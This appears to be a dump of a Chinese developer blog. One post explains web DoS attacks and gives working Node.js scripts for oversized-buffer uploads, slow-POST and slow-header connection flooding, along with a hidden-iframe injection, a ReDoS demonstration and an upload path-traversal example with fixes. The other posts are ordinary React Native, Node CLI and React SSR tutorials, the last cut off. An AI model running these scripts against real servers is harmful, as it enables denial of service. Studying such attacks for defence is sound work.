这样，这些网站就成了黑客的帮凶，从而更容易的攻陷其他网站。","text":"前言最近看书发现了几个比较有趣的 Web 攻击技术，这里记录一下。相关的是应用层 Dos 拒绝服务攻击。 应用层和网络层的 Dos最经典的网络层 Dos 就是 SYN flood，它利用了 tcp 协议的设计缺陷，由于 tcp 协议的广泛使用，所以目前想要根治这个漏洞是不可能的。 攻击者首先使用大量肉鸡服务器并伪造源 IP 地址，向服务器发送 SYN 包，希望建立 tcp 连接，服务器就会正常响应 SYN/ACK 包，等待客户端响应。攻击客户端并不会响应这些 SYN/ACk 包，服务器端判断客户端超时就会丢掉这个连接。 如果这些攻击连接数量巨大，最终服务器就会因为等待和频繁处理这种半连接而失去对正常请求的响应，从而导致拒绝服务攻击成功。 往往黑客在攻陷了几个大流量的网站后，会注入以下代码： 1&lt;iframe src=\"...\" style=\"width: 0; height: 0\"&gt;&lt;/iframe&gt; 这样，这些网站就成了黑客的帮凶，从而更容易的攻陷其他网站。 超大 Buffer如果服务器没有对文件上传大小作限制，可以使用 超大 Buffer 的攻击手法。假设对方的服务器内存只有 512 M 的小型服务器，这样的话可以向目标服务器发送一个比它内存大的文件，从而让对方的主机内存消耗殆尽。 1234567const buf = new Buffer((1 &lt;&lt; 10) * (1 &lt;&lt; 10) * 700); // 700 Mbuf.full('a');fetch('http://127.0.0.1:3000', &#123; method: 'post', body: buf,&#125;); 那么，Nodejs 应该如何解决这类攻击？那就是限制文件上传大小。 1234567let len = 0;req.on('data', (chunk) =&gt; &#123; len += chunk.length; if(len &gt; (1 &lt;&lt; 10) * (1 &lt;&lt; 10)) &#123; // 1 M res.end('error'); &#125;&#125;); Slowlori 攻击POST 慢速 Dos 攻击是在 2010 年 OWASP 大会上被揭秘的，这种攻击针对 配置较低的服务器 具有很强的威力，往往几台攻击客户端可以轻松击垮一台 Web 应用服务器。 攻击者先向 Web 应用服务器发起一个正常的 POST 请求，设定一个在 Web 服务器限定范围内并且设置比较大的 Content-Length，然后以非常慢的速度发送数据，比如 30 秒左右发一次 10 byte 的数据给服务器，保持这个连接不释放。 因为客户端一直在向服务器发包，所以服务器也不会认为连接超时，这样，服务器的一个 tcp 连接就一直被一个慢速的 POST 占用，极大地浪费服务器资源。 1234567891011121314151617181920212223242526272829303132333435const http = require('http');const options = &#123; hostname: '127.0.0.1', port: 3000, path: '/ajax', method: 'post', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': (1 &lt;&lt; 10) * (1 &lt;&lt; 10), /// 超大的 Content-Length &#125;,&#125;;let max = 1000;let reqArray = [];http.globalAgent.maxSockets = max;while (max--) &#123; reqArray.push( http.request(options, res =&gt; &#123; res.setEncoding('utf8'); &#125;) );&#125;console.log('start');// 每 5 秒，发一次数据setInterval(_ =&gt; &#123; reqArray.forEach(i =&gt; &#123; let buf = new Buffer(1 &lt;&lt; 10); buf.fill(Math.random().toString(32)); i.write(buf); &#125;);&#125;, 1000 * 5); 由于 Nodejs 天生的单线程异步性能，这样就可以只写定时器，来多连接的实现慢攻击。而不像其他语言一样需要创建 1000 多个线程来发送请求。有网友测试，发现慢 POST 攻击对 Apache + PHP 的效果十分明显， Apache 的 maxClients 几乎在瞬间被锁住，从而失去响应。 HTTP Header 攻击一般来说，Web 服务器会设定 HTTP 请求的接收时长，是指客户端在指定时间内必须把 HTTP 的 head 发送完毕。如果 Web 服务器没有在这方面限制，我们也可以用同样的原理慢速地发送 head 数据包，造成服务器连接浪费。 123456789101112131415161718192021222324const net = request('net');let max = 1000;const host = '127.0.0.1';const headStr = `GET / HTTP/1.1\\r\\nHost: $&#123;host&#125;\\r\\n`;const chientArray = [];while(max--) &#123; const chient = net.connect(&#123; post: 3000, host: host &#125;); chient.on('error', err =&gt; &#123; console.log(err); &#125;).on('end', () =&gt; &#123; console.log('end'); &#125;); chientArray.push(chient);&#125;// 慢慢发setInterval(_ =&gt; &#123; chientArray.forEach(i =&gt; &#123; i.write('xhead: gap\\r\\n'); &#125;);&#125;, 1000 * 5); 这里定义了一个发不完了请求头，定时每 5 秒发一次，类似慢 POST 攻击，不够是利用 Header 头。Nodejs 对用户的 HTTP 请求头做了大小限制，如果 Web 服务器没有做这个限制，那么可以发超大 Buffer 来恶意销毁服务器的内存。 正则表达式的 DOS 攻击正则表达式如果书写不过规范，也有可能会成为被攻击的对象。 正则表达式引擎 NFA 具有回溯性，回溯性的一个重要负面影响是，虽然正则表达式可以相当快速地计算匹配，但是确定否定匹配所需的时间会稍长。实际上，引擎必须确定输入字符串中没有任何可能的路径与正则表达式匹配才会认为否定匹配。 这就意味着引擎必须对所有路径进行测试。 比如说这两个匹配方式，只有小小的差别，但是匹配的时间却是相差很大。 123456789101112const regx1 = /^(\\d+)$/;const regx2 = /^(\\d+)+$/;const str = '1234567890123456789012345X';console.time('^(\\d+)$');regx1.test(str);console.timeEnd('^(\\d+)$');console.time('^(\\d+)+$');regx2.test(str);console.timeEnd('^(\\d+)+$'); 12^(d+)$: 0.119ms^(d+)+$: 367.251ms 假如把字符串 str 再增长一点： 12// const str = '1234567890123456789012345X'; const str = '12345678901234567890123456789X'; 这是的结果是，长达 5s 的匹配时间： 12^(d+)$: 0.137ms^(d+)+$: 5434.793ms 如果我们继续增加检测字符串的长度，那么匹配的时间就会成倍的增长，从而让服务器 CPU 处于频繁的计算中而无法处理其他任务，造成拒绝服务。 文件上传路径漏洞攻击文件上传路径的漏洞也是非常致命的，常常伴随着被恶意用户挂马或者代码泄漏。 假设，我们现在用 Nodejs 写文件上传功能，可能代码是这样的，使用 busboy 来解析文件数据。 123456789101112131415161718192021222324// 监听文件解析事件busboy.on('file', (fieldname, file, filename, encoding, mimetype) =&gt; &#123; // 文件名 name = Date.now() + '_' + filename; // 文件保存到特定路径 file.pipe(fs.createWriteStream( path.join(options.publicDir, options.uploadDir, name) )); // 开始解析文件流 file.on('data', (data) =&gt; &#123; console.log(`File [$&#123;fieldname&#125;] 已上传: $&#123;data.length&#125; bytes`); &#125;); // 解析文件结束 file.on('end', () =&gt; &#123; console.log(`File [$&#123;fieldname&#125;] 上传结束`); resolve(&#123; success: true, file: `$&#123;path.join(options.uploadDir, name)&#125;`, &#125;); &#125;);&#125;); 如果代码是这样的那么，就等着被人挂马吧。 再来看看下面的输出： 123456const path = require('path');const dir = '/public/upload/';const name = '/../../aaa.txt';const file = Date.now() + '-' + name;console.log(path.join(dir,file)); // \\aaa.txt 本来想把文件上传到 /public/upload/ 下，不知不觉被攻击者构造成根目录下，想想都觉得可怕。 上面的文件上传的漏洞在于这里： 1234567// 文件名name = Date.now() + '_' + filename;// 文件保存到特定路径file.pipe(fs.createWriteStream( path.join(options.publicDir, options.uploadDir, name))); 这里完全可以通过特殊构造把文件上传到别的地方。 那么该如何防范？ 代码改成下面的就可以解决： 123456const path = require('path');const dir = '/public/upload/';const name = '/../../aaa.txt';const file = Date.now() + '-' + path.basename(name);console.log(path.join(dir, file)); // \\public\\upload\\1495440679333-aaa.txt path.basename 用于提取出用 /隔开的 path 的最后一部分，也就上上面的 aaa.txt 部分。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://me.lizhooh.com/categories/网络安全/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"网络安全","slug":"网络安全","permalink":"http://me.lizhooh.com/tags/网络安全/"}]},{"title":"React Native Image-Picker 的使用","slug":"React Native/Media/React Native Image-Picker 的使用","date":"2017-05-20T04:52:02.000Z","updated":"2021-06-15T06:10:52.856Z","comments":true,"path":"/stories/2017/05/React Native/Media/React Native Image-Picker 的使用/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/React Native/Media/React Native Image-Picker 的使用/","excerpt":"Image-Pickerreact-native-image-picker使用一个，直接调用底层 API 的一个图片选择器。一个 React Native 模块，允许您使用本机 UI 从设备库中或直接从相机中选择照片/视频。可以实现类似这样的功能：","text":"Image-Pickerreact-native-image-picker使用一个，直接调用底层 API 的一个图片选择器。一个 React Native 模块，允许您使用本机 UI 从设备库中或直接从相机中选择照片/视频。可以实现类似这样的功能： 安装与配置1npm install --save react-native-image-picker@latest 1react-native link react-native-image-picker 配置有几个必须的操作： 更新的 Android 构建工具版本 2.2.+ 中 android/build.gradle 1234567buildscript &#123; ... dependencies &#123; classpath 'com.android.tools.build:gradle:2.2.+' // &lt;- USE 2.2.+ version &#125; ...&#125; 更新版本的 Gradle 要 2.14.1+ 在 android/gradle/wrapper/gradle-wrapper.properties 1distributionUrl=https://services.gradle.org/distributions/gradle-2.14.1-all.zip 在 AndroidManifest.xml 以下位置添加所需权限 12&lt;uses-permission android:name=\"android.permission.CAMERA\" /&gt;&lt;uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/&gt; [可选] 更改 image-picker 的颜色主题，在 android/app/res/values/themes.xml 12345678910111213&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;resources&gt; &lt;style name=\"DefaultExplainingPermissionsTheme\" parent=\"Theme.AppCompat.Light.Dialog.Alert\"&gt; &lt;!-- 按钮颜色 --&gt; &lt;item name=\"colorAccent\"&gt;@color/your_color&lt;/item&gt; &lt;!-- 文本颜色 --&gt; &lt;item name=\"android:textColorPrimary\"&gt;@color/your_color&lt;/item&gt; &lt;!-- 背景颜色 --&gt; &lt;item name=\"android:background\"&gt;@color/your_color&lt;/item&gt; &lt;/style&gt;&lt;resources&gt; 使用1234567891011121314151617181920212223242526272829303132333435363738394041import ImagePicker from 'react-native-image-picker';// 配置项const options = &#123; title: 'Select Avatar', // 标题 customButtons: [ // 包含按钮名称和标题的对象的数组 &#123; name: 'fb', title: 'Choose Photo from Facebook' &#125;, ], storageOptions: &#123; // 如果提供此键，图像将保存在 Documents iOS 应用程序的目录中， // 或者您的应用程序 Pictures 在 Android 上的目录中（而不是临时目录） skipBackup: true, path: 'images' &#125;&#125;;// 调用启动方法，这是一个异步方法ImagePicker.showImagePicker(options, (response) =&gt; &#123; console.log('Response = ', response); if (response.didCancel) &#123; console.log('用户取消的图像选择器'); &#125; else if (response.error) &#123; console.log('错误：', response.error); &#125; else if (response.customButton) &#123; console.log('用户点击自定义按钮：', response.customButton); &#125; else &#123; let source = &#123; uri: response.uri &#125;; // 应用在 image 里 this.setState(&#123; avatarSource: source &#125;); &#125;&#125;); 直接启动相机或图像库要直接启动相机或图像库（跳过警报对话框），您可以执行以下操作： 123456789// 启动相机ImagePicker.launchCamera(options, response =&gt; &#123; //与上述部分相同的代码！&#125;);// 打开图库ImagePicker.launchImageLibrary(options, response =&gt; &#123; //与上述部分相同的代码！&#125;); 配置项 options option iOS Android Info title √ √ 标题，null 或为空字符串表示删除标题 cancelButtonTitle √ √ 按钮，null 或为空字符串表示删除按钮 (Android only) takePhotoButtonTitle √ √ 按钮，null 或为空字符串表示删除按钮 chooseFromLibraryButtonTitle √ √ 按钮，null 或为空字符串表示删除按钮 customButtons √ √ 包含按钮名称和标题的对象的数组 cameraType √ - front or back mediaType √ √ 在 IOS 上： photo, video, or mixed , 在 Android 上： photo or video maxWidth √ √ Photos only maxHeight √ √ Photos only quality √ √ 0 到 1，照片质量 videoQuality √ √ 在 IOS 上：low, medium, or high, 在 Android 上：low or high durationLimit √ √ 最大录像时间，以秒为单位 rotation - √ 照片只有 0 到 360 度的旋转 allowsEditing √ - [bool] - 启用内置的 iOS 功能，可以在选择后调整图像的大小。 noData √ √ 如果为 true，则禁用生成 base64 data 字段（大大提高了大型照片的性能） storageOptions √ √ 如果提供此键，图像将保存在 Documents iOS 应用程序的目录中，或者您的应用程序 Pictures 在 Android 上的目录中（而不是临时目录） storageOptions.skipBackup √ - 如果为真，照片将不会备份到 iCloud storageOptions.path √ - 如果设置，将保存图像 Documents/[path] / 而不是根 Documents storageOptions.cameraRoll √ √ 如果为 true，裁剪的照片将保存到 iOS Camera Roll 或 Android DCIM 文件夹。 storageOptions.waitUntilSaved √ - 如果为 true，将延迟响应回调，直到照片/视频保存到相机胶卷。如果刚刚拍摄照片或视频，那么当这是真的时，文件名和时间戳字段才会在响应对象中提供。 permissionDenied.title - √ 解释权限对话框的标题 在默认情况下 Permission denied permissionDenied.text - √ 消息说明权限对话框。在默认情况下有一段很长的英文。 permissionDenied.reTryTitle - √ 重试按钮的标题。默认 re-try。 permissionDenied.okTitle - √ ok 按钮的标题。默认 I’m sure。 响应对象 response key iOS Android Description didCancel √ √ 如果用户取消了 error √ √ 包含错误信息，如果有的话 customButton √ √ 如果用户点击了其中一个自定义按钮，则包含其名称 data √ √ base64 编码图像数据（仅限照片） uri √ √ 设备上的本地文件资源的 uri（照片或视频） origURL √ - 照片库中原始资产的网址（如果存在） isVertical √ √ 如果图像是垂直定向的，将是 true width √ √ 图像宽度 height √ √ 图像高度 fileSize √ √ 文件大小（仅限照片） type - √ 文件类型（仅限照片） fileName √ (photos and videos) √ (photos) 文件名 path - √ 文件路径 latitude √ √ 纬度元数据（如果有） longitude √ √ 经度元数据（如果有） timestamp √ √ 时间戳记元数据，如果有的话，采用ISO8601 UTC格式 originalRotation - √ 旋转度（仅适用于照片） 参考资料 https://github.com/react-community/react-native-image-picker","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"React Native LayoutAnimation","slug":"React Native/Animated/React Native LayoutAnimation","date":"2017-05-18T07:00:10.000Z","updated":"2021-06-15T06:10:52.852Z","comments":true,"path":"/stories/2017/05/React Native/Animated/React Native LayoutAnimation/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/React Native/Animated/React Native LayoutAnimation/","excerpt":"布局动画 LayoutAnimationLayoutAnimation是一个布局动画，它仅发生在组件布局改变的时刻。 当布局变化时，自动将视图运动到它们新的位置上。 LayoutAnimation只对布局的创建和更新事件起作用，对删除事件是不起作用的（如删除某个元素时，该元素会消失，可能会透明度逐渐减少 ，但是不会有其他复杂的消失）。","text":"布局动画 LayoutAnimationLayoutAnimation是一个布局动画，它仅发生在组件布局改变的时刻。 当布局变化时，自动将视图运动到它们新的位置上。 LayoutAnimation只对布局的创建和更新事件起作用，对删除事件是不起作用的（如删除某个元素时，该元素会消失，可能会透明度逐渐减少 ，但是不会有其他复杂的消失）。 使用LayoutAnimation使用起来非常简单，在 Android （ios 默认开启）上需要开启UIManager.setLayoutAnimationEnabledExperimental 使用时只需要调用 API，然后更新组件布局。 12345678910111213141516171819// 使用内置的动画LayoutAnimation.configureNext(LayoutAnimation.Presets.spring);LayoutAnimation.easeInEaseOut();LayoutAnimation.spring();LayoutAnimation.linear();// 自定义LayoutAnimation.configureNext(&#123; duration: 600, create: &#123; type: LayoutAnimation.Types.spring, property: LayoutAnimation.Properties.opacity, &#125;, update: &#123; type: LayoutAnimation.Types.easeInEaseOut, &#125;,&#125;);// 之后 this.setState() 就是了，反正布局改变，动画自动触发 static configureNext(config: Config, onAnimationDidEnd?: Function, onError: Function) 有几个参数： config 配置项 duration 动画持续时间，单位是毫秒 create 配置创建新视图时的动画 update 配置被更新的视图的动画 onAnimationDidEnd 动画结束后的回调函数 onError 动画发生错误时调用 示例下面是一个示例： 1234567891011121314151617181920import React from 'react';import &#123; StyleSheet, NativeModules, LayoutAnimation, View, Text, TouchableOpacity as Touch, ScrollView,&#125; from 'react-native';const &#123; UIManager &#125; = NativeModules;// 在 android 上需要开启布局动画UIManager.setLayoutAnimationEnabledExperimental &amp;&amp; UIManager.setLayoutAnimationEnabledExperimental(true);const Dot = (&#123; x &#125;) =&gt; ( &lt;View style=&#123;[styles.box, &#123; left: x &#125;]&#125; /&gt;); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849export default class App extends React.Component &#123; state = &#123; x: 0, flag: false, list: [], &#125;; componentDidMount() &#123; // Animate the update LayoutAnimation.configureNext(&#123; duration: 600, create: &#123; type: LayoutAnimation.Types.spring, property: LayoutAnimation.Properties.opacity, &#125;, update: &#123; type: LayoutAnimation.Types.easeInEaseOut, &#125;, &#125;); &#125; onPress = () =&gt; &#123; this.setState(&#123; x: this.state.x - (this.state.flag ? 330 : -330), flag: !this.state.flag, list: [...this.state.list, this.state.x].splice(0, 10) &#125;); &#125; render() &#123; return ( &lt;ScrollView style=&#123;styles.container&#125;&gt; &#123; this.state.list.map((i, index, list) =&gt; ( index % 2 === 0 ? &lt;Dot x=&#123;this.state.x&#125; key=&#123;`dot-$&#123;index&#125;`&#125; /&gt; : &lt;Dot x=&#123;list[list.length - 1]&#125; key=&#123;`dot-$&#123;index&#125;`&#125; /&gt; )) &#125; &lt;Touch onPress=&#123;this.onPress&#125; activeOpacity=&#123;1&#125;&gt; &lt;View style=&#123;styles.button&#125;&gt; &lt;Text style=&#123;styles.buttonText&#125;&gt;Press me!&lt;/Text&gt; &lt;/View&gt; &lt;/Touch&gt; &lt;/ScrollView&gt; ); &#125;&#125; 1234567891011121314151617181920212223const styles = StyleSheet.create(&#123; container: &#123; flex: 1, justifyContent: 'center', &#125;, box: &#123; width: 30, height: 30, borderRadius: 30, backgroundColor: '#ffbb00', &#125;, button: &#123; backgroundColor: '#3af', paddingVertical: 12, marginTop: 25, alignItems: 'center', justifyContent: 'center', &#125;, buttonText: &#123; color: '#fff', fontWeight: 'bold', &#125;,&#125;);","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Nodejs 命令行开发","slug":"Nodejs/Nodejs 命令行开发","date":"2017-05-13T03:10:57.000Z","updated":"2021-06-15T06:10:52.838Z","comments":true,"path":"/stories/2017/05/Nodejs/Nodejs 命令行开发/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/Nodejs/Nodejs 命令行开发/","excerpt":"最简单开始Nodejs 里有许多优秀的命令行工具，比如：http-server, babel-cli 等。但是它们又是怎样的开发出来的？下面从最简单的Hello world!开始。","text":"最简单开始Nodejs 里有许多优秀的命令行工具，比如：http-server, babel-cli 等。但是它们又是怎样的开发出来的？下面从最简单的Hello world!开始。 可执行命令：编写一个可执行脚本 hello （在 window 上无效） 12#!/usr/bin/env nodeconsole.log('hello world'); 还需要修改权限： 1chmod 755 hello 就可以执行了： 12./hellohello world! 如果想把 hello 前面的路径去除，可以将 hello 的路径加入环境变量 PATH。但是，另一种更好的做法，是在当前目录下新建 package.json ，写入下面的内容。 123456&#123; \"name\": \"hello\", \"bin\": &#123; \"hello\": \"hello\" &#125;&#125; 再执行： 1npm link 现在再执行 hello ，就不用输入路径了。 12hellohello world! 命令行参数在 Nodejs 里，命令行的参数是通过 process.argv 获取的，类似于 c main 中的 argv * 12#!/usr/bin/env nodeconsole.log('hello ', process.argv[2]); 访问 hello tom，对应的 process.argv 是 [&#39;node&#39;, &#39;/path/to/hello&#39;, &#39;tom&#39;] 新建进程Nodejs 是单线程运行的，如果想新起一条线程是不可能的，不过可以新键一个子进程。脚本可以通过 child_process 模块新建子进程，从而执行 Unix 系统命令。 12345678910#!/usr/bin/env nodeconst name = process.argv[2];// exec 是一个命令行执行函数const exec = require('child_process').exec;// 等效于在命令行里执行 findconst child = exec(`find $&#123;name&#125;`, (err, stdout, stderr) =&gt; &#123; if (err) throw err; console.log(stdout);&#125;); shelljs 模块shelljs模块重新包装了child_process，调用系统命令更加方便。它需要安装后使用。 安装： 1npm install --save shelljs 上面的代码用 shelljs 来调用： 1shell.exec(`find $&#123;name&#125;`); 上面代码是 shelljs 的本地模式，即通过 exec 方法执行 shell 命令。此外还有全局模式，允许直接在脚本中写 shell 命令。也就是不需要写 shell.ls()，而是写 ls()。 12345678910111213141516171819202122232425262728293031require('shelljs/global');// 查询 git 命令if (!which('git')) &#123; echo('Sorry, this script requires git'); exit(1);&#125;// 递归创建目录mkdir('-p', 'out/Release');// 复制文件cp('-R', 'stuff/*', 'out/Release');// 去到指定目录cd('lib');// 显示目录文件ls('*.js').forEach(function (file) &#123; // 写入 sed('-i', 'v0.1.2', 'v0.1.2', file); sed('-i', /.*REPLACE_LINE_WITH_MACRO.*\\n/, cat('macro.js'), file);&#125;);// 返回上一层cd('..');// 使用 execif (exec('git commit -am \"Auto-commit\"').code !== 0) &#123; echo('Error: Git commit failed'); exit(1);&#125; yargs 模块shelljs只解决了如何调用 shell 命令，而yargs模块能够解决如何处理命令行参数。它也需要安装。 安装： 1npm install --save yargs yargs 模块提供 argv 对象，用来读取命令行参数。 123#!/usr/bin/env nodeconst argv = require('yargs').argv;console.log('hello ', argv.name); 使用： hello –name=xiaoming hello –name xiaoming 可以使用 alias 方法，指定 name 是 n 的别名 123456#!/usr/bin/env nodeconst argv = require('yargs') .alias('n', 'name') .argv;console.log('hello ', argv.n); argv 对象有一个下划线（_）属性，可以获取 非连词线开头 的参数 12345#!/usr/bin/env nodeconst argv = require('yargs').argv;console.log('hello ', argv.n);console.log(argv._); 使用： 123$ hello A -n tom B Chello tom[ 'A', 'B', 'C' ] 命令行参数的配置yargs模块还提供 3 个方法，用来配置命令行参数。 demand：是否必选 default：默认值 describe：提示 12345678#!/usr/bin/env nodeconst argv = require('yargs') .demand(['n']) // 必选 .default(&#123;n: 'tom'&#125;) // 默认值 .describe(&#123;n: 'your name'&#125;) // 提示 .argv;console.log('hello ', argv.n); 如果有默认，必选项在没有填写时，就会选择默认值；如果没有默认，必选项在没有填写时，会报错。 1234Options: -n your name [required]Missing required argument: n 有时，某些参数不需要值，只起到一个开关作用，这时可以用 boolean 方法指定这些参数返回布尔值。 123456#!/usr/bin/env nodeconst argv = require('yargs') .boolean(['n']) // 默认是 false .argv;console.log('hello ', argv.n); 也可以指定默认的布尔值： 123456#!/usr/bin/env nodeconst argv = require('yargs') .option('n', &#123; boolean: true &#125;) // 默认为 true .argv;console.log('hello ', argv.n); 帮助信息yargs模块提供以下方法，生成帮助信息。 usage：用法格式 example：提供例子 help：显示帮助信息 epilog：出现在帮助信息的结尾 1234567891011121314151617#!/usr/bin/env nodeconst argv = require('yargs') .option('f', &#123; alias: 'name', demand: true, default: 'tom', describe: 'your name', type: 'string' &#125;) .usage('Usage: hello [options]') .example('hello -n tom', 'say hello to Tom') // 示例 .help('h') // 帮助 .alias('h', 'help') // 别名 .epilog('copyright 2015') // 版权 .argv;console.log('hello ', argv.n); 执行结果如下： 123456789101112$ hello -hUsage: hello [options]Options: -f, --name your name [string] [required] [default: \"tom\"] -h, --help Show help [boolean]Examples: hello -n tom say hello to Tomcopyright 2015 子命令yargs模块还允许通过 command 方法，设置 Git 风格的子命令。 1234567891011#!/usr/bin/env nodeconst argv = require('yargs') .command(\"morning\", \"good morning\", yargs =&gt; &#123; console.log(\"Good Morning\"); &#125;) .command(\"evening\", \"good evening\", yargs =&gt; &#123; console.log(\"Good Evening\"); &#125;) .argv;console.log('hello ', argv.n); 用法如下： 123$ hello morning -n tomGood Morninghello tom 每个子命令往往有自己的参数，这时就需要在回调函数中单独指定。回调函数中，要先用 reset 方法重置 yargs 对象。 123456789101112131415161718#!/usr/bin/env noderequire('shelljs/global');const argv = require('yargs') .command(\"morning\", \"good morning\", yargs =&gt; &#123; echo(\"Good Morning\"); const argv = yargs.reset() .option(\"m\", &#123; alias: \"message\", description: \"provide any sentence\" &#125;) .help(\"h\") .alias(\"h\", \"help\") .argv; echo(argv.m); &#125;) .argv; 用法如下： 123$ hello morning -m \"Are you hungry?\"Good MorningAre you hungry? 其他事项返回值根据 Unix 传统，程序执行成功返回 0，否则返回 1 process.exit(1); process.exit(0); 重定向Unix 允许程序之间使用管道重定向数据。 $ ps aux | grep &#39;node&#39; 脚本可以通过监听标准输入的data 事件，获取重定向的数据。 12345process.stdin.resume();process.stdin.setEncoding('utf8');process.stdin.on('data', function(data) &#123; process.stdout.write(data);&#125;); 系统信号操作系统可以向执行中的进程发送信号，process 对象能够监听信号事件。 1234process.on('SIGINT', function () &#123; console.log('Got a SIGINT'); process.exit(0);&#125;); 发送信号的方法如下： 1$ kill -s SIGINT [process_id] 参考资料 http://www.ruanyifeng.com/blog/2015/05/command-line-with-node.htmlshelljs: https://github.com/shelljs/shelljsyargs: https://github.com/yargs/yargs","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"React 服务端渲染（SSR）","slug":"React/Universal 同构/React 服务端渲染","date":"2017-05-12T03:53:39.000Z","updated":"2021-06-15T06:10:52.887Z","comments":true,"path":"/stories/2017/05/React/Universal 同构/React 服务端渲染/","link":"","permalink":"http://me.lizhooh.com/stories/2017/05/React/Universal 同构/React 服务端渲染/","excerpt":"React Server研究了一个上午，React 是如何进行服务端渲染的？ 首先，React 在 Nodejs 里有两个 API： 12345import React from 'react';import &#123; renderToString, renderToStaticMarkup&#125; from 'react-dom/server'; renderToString 是把 React 元素转成一个 HTML 字符串，因为服务端渲染已经标识了 reactid，所以在浏览器端再次渲染，React 只是做事件绑定，而不会将所有的 DOM 树重新渲染，这样能带来高性能的页面首次加载！同构黑魔法主要从这个 API 而来。 renderToStaticMarkup 这个 API 相当于一个简化版的 renderToString，如果你的应用基本上是静态文本，建议用这个方法，少了一大批的 reactid，DOM 树自然精简了，在 IO 流传输上节省一部分流量。","text":"React Server研究了一个上午，React 是如何进行服务端渲染的？ 首先，React 在 Nodejs 里有两个 API： 12345import React from 'react';import &#123; renderToString, renderToStaticMarkup&#125; from 'react-dom/server'; renderToString 是把 React 元素转成一个 HTML 字符串，因为服务端渲染已经标识了 reactid，所以在浏览器端再次渲染，React 只是做事件绑定，而不会将所有的 DOM 树重新渲染，这样能带来高性能的页面首次加载！同构黑魔法主要从这个 API 而来。 renderToStaticMarkup 这个 API 相当于一个简化版的 renderToString，如果你的应用基本上是静态文本，建议用这个方法，少了一大批的 reactid，DOM 树自然精简了，在 IO 流传输上节省一部分流量。 那么下面就开始，React 服务端渲染。 ES6，7 环境配置react主要配置 react, stage-0 即可。 1npm install --save-dev babel-preset-react babel-preset-stage-0 123&#123; \"presets\": [\"react\", \"stage-0\"]&#125; babel-node因为最新版的 Nodejs 对 ES6 还没达到 100% 的支持，所以用 babel-node 来代替 node，并且它支持 es6, jsx。 安装： 1npm install -g babel-cli 安装完之后，把 node 换成 babel-node 即可。 12# node app.jsbabel-node app.js 注意：如果在使用babel时遇到以下错误： 1ReferenceError: regeneratorRuntime is not defined 那么安装： 1npm install --save-dev babel-plugin-transform-runtime 123456&#123; \"presets\": [\"react\", \"stage-0\"], \"plugins\": [ \"transform-runtime\" ]&#125; app目录结构： 123456789├── package.json├── react├ ├── getState.js├ ├── hello.jsx├ └── index.js├── app.js├── public└── views └── index.ejs Hello接下来编写一个组件，这个组件是共用的代码，在前端需要用 Webpack 编译成 es5 代码，在 Nodejs 上因为有 babel-node 就不需要编译。 123456789101112131415161718192021222324252627import React, &#123; Component &#125; from 'react';import getState from './getState';export default class Hello extends Component &#123; constructor(props) &#123; super(props); this.state = getState(); &#125; onChange = event =&gt; &#123; this.setState(&#123; text: event.target.value &#125;); &#125; render() &#123; return ( &lt;div&gt; &lt;h2&gt;Hello&lt;/h2&gt; &lt;div&gt;&#123;this.state.text&#125;&lt;/div&gt; &lt;input type=\"text\" value=&#123;this.state.text&#125; onChange=&#123;this.onChange&#125; /&gt; &lt;/div&gt; ); &#125;&#125; render编写 render 函数，这也是前后端共用的代码。 12345678910import React from 'react';import &#123; render &#125; from 'react-dom';import Hello from './hello';if (typeof window !== 'undefined' &amp;&amp; window) &#123; render( &lt;Hello /&gt;, document.getElementById('root') );&#125; getStategetState 是一个初始化状态的函数，它会根据当前的环境不同而获取 state。 1234567export default (state = &#123;&#125;) =&gt; &#123; if (typeof window !== 'undefined' &amp;&amp; window.__STATE__) &#123; state = window.__STATE__; &#125; return state;&#125; app.js1234567891011121314151617181920212223242526272829303132333435363738394041import 'colors';import Koa from 'koa';import logger from 'koa-logger';import statics from 'koa-static';import Router from 'koa-router';import bodyparser from 'koa-bodyparser';import views from 'koa-views';import gzip from 'koa-gzip';import React from 'react';import &#123; renderToString &#125; from 'react-dom/server';import Hello from './react/hello';const app = new Koa();const router = new Router();// 服务端首屏渲染router.get('/', async ctx =&gt; &#123; await ctx.render('index', &#123; app: renderToString( &lt;Hello /&gt; ), state: JSON.stringify(&#123; text: '呵呵呵' &#125;) &#125;);&#125;);// 中间件app .use(logger()) .use(gzip()) .use(statics(__dirname + '/public')) .use(bodyparser()) .use(views(__dirname + '/views', &#123; extension: 'ejs' &#125;)) .use(router.routes())app.listen(3000, _ =&gt; &#123; console.log('\\n\\trun server in 3000\\n'.red);&#125;); view视图模版使用 ejs，main.2ebb5379.js 是使用 Webpack 编译出来的前端代码。在 ejs 里，&lt;%- %&gt; 指的是不转义，&lt;%= %&gt; 指的是不转义。 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta 